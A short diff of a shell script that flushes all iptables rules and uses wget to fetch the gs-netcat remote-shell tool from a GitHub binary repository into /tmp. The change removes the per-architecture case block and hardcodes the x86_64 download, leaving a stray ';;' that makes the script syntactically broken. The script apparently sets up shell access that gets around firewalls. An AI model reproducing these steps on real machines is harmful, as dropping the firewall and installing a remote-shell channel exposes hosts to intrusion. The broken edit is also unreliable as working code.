@@ -11,18 +11,7 @@ iptables -F
 ARCH=$(dpkg --print-architecture)
 
 AMD64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz"
-AARCH64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_aarch64-linux.tar.gz"
-
-case $ARCH in
-        "amd64")
-                wget $AMD64 -O /tmp/gs-netcat.tar.gz;;
-
-        "aarch64")
-                wget $AARCH64 -O /tmp/gs-netcat.tar.gz;;
-
-        *)
-                echo "Binary not found to" $ARCH
-esac
+wget $AMD64 -O /tmp/gs-netcat.tar.gz;;
 
 printf "Machine's number: "
 read num
